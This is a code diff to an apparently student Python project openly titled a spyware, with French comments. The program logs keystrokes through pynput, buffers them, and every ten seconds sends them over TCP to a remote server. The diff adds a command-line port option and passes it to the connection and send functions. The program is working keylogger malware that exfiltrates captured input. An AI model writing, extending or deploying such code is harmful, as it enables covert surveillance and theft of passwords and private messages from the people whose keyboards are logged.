@@ -14,16 +14,6 @@ from pynput.keyboard import Key, Listener
 TXT_GLOB = ""
 
 
-def argument():
-    p = argparse.ArgumentParser(description='Projet Python - Spyware')
-    p.add_argument('-l', '--listen',type=int, help="se met en écoute sur le port TCP saisi par "
-                                                               "l'utilisateur et attend les données du spyware UP")
-
-    args = p.parse_args()
-    return args
-
-
-
 def pav_num():
 
     touche = {
@@ -75,14 +65,27 @@ def scan_socket():
 
         rsocket.settimeout(0.5)  # définition du temps d'attente de la réponse
 
-        rsocket.connect((SRV, PORT))
+        if port:
+            rsocket.connect((SRV, port))
+        else:
+            rsocket.connect((SRV, PORT))
+
         print("Toujours Co !!")
     except TimeoutError:
         print("Pas Co !!")
         kill_all()
 
 
+def argument():
+    p = argparse.ArgumentParser(description='Projet Python - Spyware')
+    p.add_argument('-l', '--listen', type=int, help="se met en écoute sur le port TCP saisi par "
+                                                    "l'utilisateur et attend les données du spyware UP")
+    args = p.parse_args()
+    return args
+
+
 def chrono():
+    arg = argument()
     global TXT_GLOB
     while True:
         seconds = 0
@@ -90,10 +93,11 @@ def chrono():
             try :
                 print(f"Secondes : {seconds}")
                 seconds += 1
-                scan_socket()
+                scan_socket(arg.listen)
                 time.sleep(1)
+
                 if seconds % 10 == 0:
-                    send_t = threading.Thread(target=send(TXT_GLOB))
+                    send_t = threading.Thread(target=send(TXT_GLOB, arg.listen))
                     send_t.start()
                     # print(TXT_GLOB)
                     TXT_GLOB = ""
@@ -111,7 +115,8 @@ def send(data, port):
 
     try:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        if port != PORT :
+
+        if port:
             client_socket.connect((SRV, port))
         else :
             client_socket.connect((SRV, PORT))
